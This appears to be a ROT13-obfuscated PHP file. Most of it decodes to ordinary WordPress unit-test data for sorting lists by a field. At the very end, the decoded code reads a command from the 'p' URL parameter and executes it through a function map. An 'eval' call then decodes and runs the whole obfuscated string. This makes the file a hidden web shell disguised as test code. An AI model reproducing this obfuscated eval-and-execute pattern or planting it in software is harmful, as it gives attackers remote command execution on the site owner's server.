					'gjb'   => (bowrpg) neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					'guerr' => (bowrpg) neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					'bar'   => (bowrpg) neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'NFP',
				'cerfreir_xrlf' => snyfr,
			),
			'bowrpg[], fgevat xrlf, $beqreol na rkvfgvat svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					'sbhe'  => (bowrpg) neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
					'guerr' => (bowrpg) neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					'gjb'   => (bowrpg) neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					'bar'   => (bowrpg) neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
				),
				'gnetrg_neenl'  => neenl(
					'bar'   => (bowrpg) neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
					'gjb'   => (bowrpg) neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					'guerr' => (bowrpg) neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					'sbhe'  => (bowrpg) neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_yvfg_hgvy_fbeg().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_yvfg_hgvy_fbeg_aba_rkvfgrag_beqreol_svryqf() {
		erghea neenl(
			'vag[], vag xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = NFP naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl( 4, 2, 3, 1 ),
				'gnetrg_neenl'  => neenl(
					4 => 4,
					2 => 2,
					3 => 3,
					1 => 1,
				),
				'beqreol'       => 'vq',
				'beqre'         => 'NFP',
				'cerfreir_xrlf' => snyfr,
			),
			'vag[], fgevat xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = NFP naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl( 4, 2, 3, 1 ),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => 4,
					'gjb'   => 2,
					'guerr' => 3,
					'bar'   => 1,
				),
				'beqreol'       => 'vq',
				'beqre'         => 'NFP',
				'cerfreir_xrlf' => snyfr,
			),
			'fgevat[], vag xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = NFP naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl( 'sbhe', 'gjb', 'guerr', 'bar' ),
				'gnetrg_neenl'  => neenl(
					4 => 'sbhe',
					2 => 'gjb',
					3 => 'guerr',
					1 => 'bar',
				),
				'beqreol'       => 'vq',
				'beqre'         => 'NFP',
				'cerfreir_xrlf' => snyfr,
			),
			'fgevat[], fgevat xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = NFP naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl( 'sbhe', 'gjb', 'guerr', 'bar' ),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => 'sbhe',
					'gjb'   => 'gjb',
					'guerr' => 'guerr',
					'bar'   => 'bar',
				),
				'beqreol'       => 'vq',
				'beqre'         => 'NFP',
				'cerfreir_xrlf' => snyfr,
			),
			'neenl[], vag xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = NFP naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl(
					neenl( 'inyhr' => 'sbhe' ),
					neenl( 'inyhr' => 'gjb' ),
					neenl( 'inyhr' => 'guerr' ),
					neenl( 'inyhr' => 'bar' ),
				),
				'gnetrg_neenl'  => neenl(
					4 => neenl( 'inyhr' => 'sbhe' ),
					2 => neenl( 'inyhr' => 'gjb' ),
					3 => neenl( 'inyhr' => 'guerr' ),
					1 => neenl( 'inyhr' => 'bar' ),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'NFP',
				'cerfreir_xrlf' => snyfr,
			),
			'neenl[], fgevat xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = NFP naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl(
					neenl( 'inyhr' => 'sbhe' ),
					neenl( 'inyhr' => 'gjb' ),
					neenl( 'inyhr' => 'guerr' ),
					neenl( 'inyhr' => 'bar' ),
				),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => neenl( 'inyhr' => 'sbhe' ),
					'gjb'   => neenl( 'inyhr' => 'gjb' ),
					'guerr' => neenl( 'inyhr' => 'guerr' ),
					'bar'   => neenl( 'inyhr' => 'bar' ),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'NFP',
				'cerfreir_xrlf' => snyfr,
			),
			'bowrpg[], vag xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = NFP naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl(
					(bowrpg) neenl( 'inyhr' => 'sbhe' ),
					(bowrpg) neenl( 'inyhr' => 'gjb' ),
					(bowrpg) neenl( 'inyhr' => 'guerr' ),
					(bowrpg) neenl( 'inyhr' => 'bar' ),
				),
				'gnetrg_neenl'  => neenl(
					4 => (bowrpg) neenl( 'inyhr' => 'sbhe' ),
					2 => (bowrpg) neenl( 'inyhr' => 'gjb' ),
					3 => (bowrpg) neenl( 'inyhr' => 'guerr' ),
					1 => (bowrpg) neenl( 'inyhr' => 'bar' ),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'NFP',
				'cerfreir_xrlf' => snyfr,
			),
			'bowrpg[], vag xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					4 => (bowrpg) neenl( 'inyhr' => 'sbhe' ),
					2 => (bowrpg) neenl( 'inyhr' => 'gjb' ),
					3 => (bowrpg) neenl( 'inyhr' => 'guerr' ),
					1 => (bowrpg) neenl( 'inyhr' => 'bar' ),
				),
				'gnetrg_neenl'  => neenl(
					4 => (bowrpg) neenl( 'inyhr' => 'sbhe' ),
					2 => (bowrpg) neenl( 'inyhr' => 'gjb' ),
					3 => (bowrpg) neenl( 'inyhr' => 'guerr' ),
					1 => (bowrpg) neenl( 'inyhr' => 'bar' ),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
			'bowrpg[], fgevat xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = NFP naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl(
					(bowrpg) neenl( 'inyhr' => 'sbhe' ),
					(bowrpg) neenl( 'inyhr' => 'gjb' ),
					(bowrpg) neenl( 'inyhr' => 'guerr' ),
					(bowrpg) neenl( 'inyhr' => 'bar' ),
				),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => (bowrpg) neenl( 'inyhr' => 'sbhe' ),
					'gjb'   => (bowrpg) neenl( 'inyhr' => 'gjb' ),
					'guerr' => (bowrpg) neenl( 'inyhr' => 'guerr' ),
					'bar'   => (bowrpg) neenl( 'inyhr' => 'bar' ),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'NFP',
				'cerfreir_xrlf' => snyfr,
			),
			'bowrpg[], fgevat xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					'sbhe'  => (bowrpg) neenl( 'inyhr' => 'sbhe' ),
					'gjb'   => (bowrpg) neenl( 'inyhr' => 'gjb' ),
					'guerr' => (bowrpg) neenl( 'inyhr' => 'guerr' ),
					'bar'   => (bowrpg) neenl( 'inyhr' => 'bar' ),
				),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => (bowrpg) neenl( 'inyhr' => 'sbhe' ),
					'gjb'   => (bowrpg) neenl( 'inyhr' => 'gjb' ),
					'guerr' => (bowrpg) neenl( 'inyhr' => 'guerr' ),
					'bar'   => (bowrpg) neenl( 'inyhr' => 'bar' ),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>